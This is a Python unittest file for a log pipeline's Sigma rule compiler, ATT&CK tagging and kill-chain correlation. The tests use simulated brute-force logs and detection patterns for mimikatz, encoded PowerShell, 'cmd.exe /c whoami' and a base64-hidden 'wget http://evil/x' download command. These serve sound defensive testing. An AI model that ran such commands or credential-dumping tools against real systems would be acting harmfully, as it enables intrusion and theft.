"""Phase 5: Sigma rule compiler, ATT&CK tagging, kill-chain correlation with Sigma detections."""
from __future__ import annotations

import os
import sys
import tempfile
import time
import unittest
from datetime import datetime, timedelta, timezone

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import tests._isolation  # noqa: E402,F401

import yaml  # noqa: E402


def rule(text: str):
    from ulpf.intelligence.sigma import compile_rule
    return compile_rule(yaml.safe_load(text))


def view(event: dict):
    from ulpf.intelligence.sigma import EventView
    return EventView(event)


def ev(**kw) -> dict:
    base = {"event_id": kw.pop("event_id", "e1"), "timestamp": kw.pop("timestamp", "2026-01-01T00:00:00+00:00"),
            "category": "network", "action": "other", "severity": 3, "message": "", "raw_event": "",
            "raw_format": "syslog", "source": {"ip": None, "port": None, "hostname": None},
            "destination": {"ip": None, "port": None, "hostname": None}, "network": {"bytes_out": None},
            "user": {"name": None, "target": {"name": None}, "source": {"name": None}}, "device": {"hostname": None},
            "threat": {"category": None, "ioc_value": None, "signature": None}, "rule": {"name": None},
            "parsed_fields": {}}
    for k, v in kw.items():
        if isinstance(v, dict) and isinstance(base.get(k), dict):
            base[k].update(v)
        else:
            base[k] = v
    return base


class TestCompiler(unittest.TestCase):
    def test_value_semantics_and_modifiers(self):
        r = rule("""
title: t
logsource: {product: ulpf}
detection:
  sel:
    message|contains: 'Failed Password'
    source.ip|cidr: 10.0.0.0/8
    destination.port: [22, 2222]
    user.name|startswith: 'adm'
    raw_event|re|i: 'ssh2$'
    CommandLine|endswith|windash: ' -enc'
    Image: 'C:\\\\Windows\\\\*\\\\cmd.exe'
  condition: sel
""")
        hit = ev(message="sshd: failed password for admin", source={"ip": "10.1.2.3"}, destination={"port": 22},
                 user={"name": "Administrator"}, raw_event="... port 4 SSH2",
                 parsed_fields={"commandline": "powershell /enc", "Image": "c:\\windows\\System32\\CMD.EXE"})
        self.assertTrue(r.matches(view(hit)))
        for change in ({"source": {"ip": "8.8.8.8"}}, {"destination": {"port": 80}}, {"user": {"name": "root"}},
                       {"parsed_fields": {"commandline": "powershell -x", "Image": "c:\\windows\\cmd.exe"}}):
            miss = ev(**{**hit, **change})
            self.assertFalse(r.matches(view(miss)), change)

    def test_conditions_and_quantifiers(self):
        r = rule("""
title: t
logsource: {product: ulpf}
detection:
  sel_a: {action: failed}
  sel_b: {category: authentication}
  sel_c: {severity|gte: 7}
  filter: {source.ip|cidr: 192.168.0.0/16}
  condition: (2 of sel_* and not filter) or all of them
""")
        self.assertTrue(r.matches(view(ev(action="failed", category="authentication", source={"ip": "1.2.3.4"}))))
        self.assertFalse(r.matches(view(ev(action="failed", category="authentication", source={"ip": "192.168.1.1"}))))
        self.assertFalse(r.matches(view(ev(action="failed", source={"ip": "1.2.3.4"}))))
        r2 = rule("""
title: t
logsource: {product: ulpf}
detection:
  k: [mimikatz, 'sekurlsa*logon']
  n: {user.name: null}
  condition: k and n
""")
        self.assertTrue(r2.matches(view(ev(raw_event="run SEKURLSA::logonpasswords"))))
        self.assertFalse(r2.matches(view(ev(raw_event="mimikatz", user={"name": "bob"}))))

    def test_raw_vendor_field_names_resolve(self):
        r = rule("""
title: t
logsource: {product: windows}
detection:
  sel: {EventID: 4625, TargetUserName: alice, IpAddress|cidr: 203.0.113.0/24, LogonType: 3}
  condition: sel
""")
        e = ev(user={"target": {"name": "alice"}}, source={"ip": "203.0.113.7"},
               parsed_fields={"EventID": "4625", "LogonType": 3})
        self.assertTrue(r.matches(view(e)))

    def test_base64_and_exists(self):
        r = rule("""
title: t
logsource: {product: ulpf}
detection:
  sel:
    CommandLine|base64offset|contains: 'http://'
    rule.name|exists: false
  condition: sel
""")
        import base64
        for pad in ("", "a", "ab"):
            payload = base64.b64encode((pad + "wget http://evil/x").encode()).decode()
            self.assertTrue(r.matches(view(ev(parsed_fields={"CommandLine": f"sh -c {payload}"}))), pad)

    def test_unsupported_rules_are_rejected_with_reasons(self):
        from ulpf.intelligence.sigma import SigmaError
        for bad, why in (
            ("detection: {sel: {a|expand: x}, condition: sel}", "unsupported modifier"),
            ("detection: {sel: {a: 1}, condition: 'sel | max(x) > 3'}", "only count()"),
            ("detection: {sel: {a: 1}, condition: 'sel and other'}", "undefined selection"),
            ("detection: {sel: {a: 1}, condition: 'sel and ('}", "ends early"),
            ("correlation: {type: event_count}", "compile_correlation"),    # a correlation is not a detection rule
        ):
            with self.assertRaises(SigmaError) as cm:
                rule("title: t\n" + bad)
            self.assertIn(why, str(cm.exception))

    def test_attack_tags_map_to_techniques_tactics_and_stages(self):
        r = rule("""
title: t
logsource: {product: ulpf}
detection: {sel: {action: failed}, condition: sel}
tags: [attack.credential_access, attack.t1110.001, attack.g0016]
""")
        self.assertEqual(r.techniques, ["T1110.001"])
        self.assertEqual(r.tactics, ["credential_access"])
        self.assertEqual(r.stages, ["exploitation"])

    def test_builtin_pack_compiles(self):
        from ulpf.intelligence.sigma import load_rules
        rules, errors = load_rules()
        self.assertEqual(errors, [])
        techniques = {t for r in rules for t in r.techniques}
        for t in ("T1110", "T1071", "T1059", "T1078", "T1046", "T1190"):
            self.assertIn(t, techniques)

    def test_rule_collections_and_directories(self):
        from ulpf.intelligence.sigma import load_rules
        d = tempfile.mkdtemp()
        with open(os.path.join(d, "coll.yml"), "w") as f:
            f.write("action: global\nlogsource: {product: ulpf}\nlevel: low\n---\n"
                    "title: a\nid: r-a\ndetection: {s: {action: failed}, condition: s}\n---\n"
                    "title: b\nid: r-b\ndetection: {s: {action: denied}, condition: s}\n---\n"
                    "title: broken\nid: r-c\ndetection: {s: {x|nope: 1}, condition: s}\n")
        rules, errors = load_rules([d], builtin=False)
        self.assertEqual([r.id for r in rules], ["r-a", "r-b"])
        self.assertTrue(all(r.level == "low" for r in rules))
        self.assertEqual(len(errors), 1)


class TestAggregation(unittest.TestCase):
    def test_brute_force_fires_once_per_window(self):
        from ulpf.intelligence.sigma import builtin_engine
        eng = builtin_engine()
        t0 = datetime(2026, 1, 1, tzinfo=timezone.utc)
        fired = []
        for i in range(12):
            e = ev(event_id=f"f{i}", category="authentication", action="failed", source={"ip": "45.33.32.156"},
                   user={"name": "root"})
            fired += eng.detect(e, t0 + timedelta(seconds=10 * i))
        brute = [d for d in fired if d.rule.id == "ulpf-0001-brute-force"]
        self.assertEqual(len(brute), 1)
        self.assertEqual(brute[0].count, 5)
        self.assertEqual(brute[0].event_id, "f4")
        # another source is counted separately; old failures leave the window
        fired = [d for i in range(5) for d in eng.detect(
            ev(event_id=f"g{i}", category="authentication", action="failed", source={"ip": "1.1.1.1"}),
            t0 + timedelta(minutes=10 * i))]
        self.assertFalse([d for d in fired if d.rule.id == "ulpf-0001-brute-force"])

    def test_distinct_count(self):
        from ulpf.intelligence.sigma import builtin_engine
        eng = builtin_engine()
        t0 = datetime(2026, 1, 1, tzinfo=timezone.utc)
        out = []
        for i in range(6):
            out += eng.detect(ev(event_id=f"s{i}", category="authentication", action="failed",
                                 source={"ip": "9.9.9.9"}, user={"name": f"user{i}"}), t0 + timedelta(seconds=i))
        self.assertIn("ulpf-0002-password-spraying", [d.rule.id for d in out])


class TestCorrelationWithSigma(unittest.TestCase):
    def test_groups_carry_attack_techniques_and_stages(self):
        from ulpf.intelligence.correlation import EventCorrelator
        c = EventCorrelator(300)
        atk = "185.220.101.44"
        t0 = datetime(2026, 1, 1, tzinfo=timezone.utc)
        msgs = [("nmap port scan", "ids_ips", "alert", 4)] + [("Failed password for root", "authentication", "failed", 5)] * 6 + \
               [("Accepted password for root", "authentication", "success", 3),
                ("powershell -enc SQBFAFgA", "endpoint", "detected", 8),
                ("beacon to c2 server", "ids_ips", "alert", 8)]
        for i, (m, cat, act, sev) in enumerate(msgs):
            c.add_and_correlate(ev(event_id=f"k{i}", timestamp=(t0 + timedelta(seconds=5 * i)).isoformat(),
                                   message=m, raw_event=m, category=cat, action=act, severity=sev,
                                   source={"ip": atk}, destination={"ip": "10.0.0.5"}, user={"name": "root"}))
        g = c.get_results()[0]
        ids = {t["id"] for t in g["mitre"]["techniques"]}
        for t in ("T1046", "T1110", "T1078", "T1059", "T1071"):
            self.assertIn(t, ids)
        self.assertIn("credential_access", [t["name"].lower().replace(" ", "_") for t in g["mitre"]["tactics"]])
        self.assertEqual(g["kill_chain_stages"][:1], ["reconnaissance"])
        self.assertIn("command_and_control", g["kill_chain_stages"])
        self.assertTrue(any(r["id"] == "ulpf-0001-brute-force" for r in g["sigma_rules"]))
        self.assertGreater(g["risk_score"], 7)
        self.assertTrue(c.detections)

    def test_baseline_stages_without_sigma(self):
        from ulpf.intelligence.correlation import EventCorrelator
        c = EventCorrelator(60, sigma=None)
        t0 = datetime(2026, 1, 1, tzinfo=timezone.utc)
        for i, m in enumerate(["port scan nmap probe", "sql injection exploit"]):
            c.add_and_correlate(ev(event_id=f"b{i}", timestamp=(t0 + timedelta(seconds=i)).isoformat(), message=m,
                                   severity=6, source={"ip": "5.5.5.5"}))
        g = c.get_results()[0]
        self.assertEqual(g["kill_chain_stages"], ["reconnaissance", "exploitation"])
        self.assertEqual(g["mitre"]["techniques"], [])

    def test_worker_hits_are_used_on_projections(self):
        """The host sees projections (no raw fields); the worker's Sigma hits carry the detection."""
        from ulpf.intelligence.correlation import EventCorrelator
        from ulpf.intelligence.sigma import builtin_engine
        worker_side = builtin_engine()
        host = EventCorrelator(60)
        t0 = datetime(2026, 1, 1, tzinfo=timezone.utc)
        for i in range(2):
            full = ev(event_id=f"w{i}", timestamp=(t0 + timedelta(seconds=i)).isoformat(),
                      parsed_fields={"CommandLine": "cmd.exe /c whoami"}, raw_event="cmd.exe /c whoami",
                      source={"ip": "7.7.7.7"})
            proj = {k: full[k] for k in ("event_id", "timestamp", "category", "action", "severity", "message")}
            proj["source"] = {"ip": "7.7.7.7"}
            proj["sigma"] = worker_side.match(full)
            host.add_and_correlate(proj)
        g = host.get_results()[0]
        self.assertIn("T1059", {t["id"] for t in g["mitre"]["techniques"]})


class TestRuntimeDetections(unittest.TestCase):
    def test_brute_force_over_tcp_becomes_a_detection_and_a_tagged_group(self):
        import json
        from tests.test_usp import free_port, q, runtime, send_tcp, wait_for
        d = tempfile.mkdtemp(prefix="ulpf_sigma_rt_")
        port = free_port()
        rt = runtime(d, {"inputs": [{"type": "syslog", "name": "auth", "protocol": "tcp", "host": "127.0.0.1",
                                     "port": port}],
                         "evidence": {"enabled": False},
                         "analytics": {"correlation": {"window_seconds": 30}}})
        atk = "185.220.101.44"
        try:
            send_tcp(port, [f"<38>Oct 21 11:00:{i:02d} bastion sshd[901]: Failed password for root from {atk} "
                            f"port {40000 + i} ssh2" for i in range(8)] +
                     [f"<38>Oct 21 11:00:30 bastion sshd[901]: Accepted password for root from {atk} port 40100 ssh2"])
            time.sleep(1.0)
            send_tcp(port, ["<38>Oct 21 11:05:00 web01 cron[77]: job backup finished"])   # closes the window

            def kind(k):
                return [json.loads(r[0]) for r in q(rt, "SELECT normalised_json FROM events WHERE "
                                                        "json_extract_string(normalised_json, '$.event_kind') = ?", [k])]
            self.assertTrue(wait_for(lambda: any(e["rule"]["id"] == "ulpf-0001-brute-force" for e in kind("detection")),
                                     30), kind("detection"))
            det = next(e for e in kind("detection") if e["rule"]["id"] == "ulpf-0001-brute-force")
            self.assertIn("T1110", det["extensions"]["detection"]["techniques"])
            self.assertEqual(det["extensions"]["detection"]["key"], atk)
            self.assertTrue(any(e["rule"]["id"] == "ulpf-0004-privileged-logon-external" for e in kind("detection")))
            self.assertTrue(wait_for(lambda: any(atk in json.dumps(g) for g in kind("correlation")), 30))
            g = [g for g in kind("correlation") if atk in json.dumps(g)][-1]["extensions"]["correlation"]
            self.assertTrue({"T1110", "T1078"} <= {t["id"] for t in g["mitre"]["techniques"]})
            self.assertIn("exploitation", g["kill_chain_stages"])
        finally:
            rt.stop()


if __name__ == "__main__":
    unittest.main()
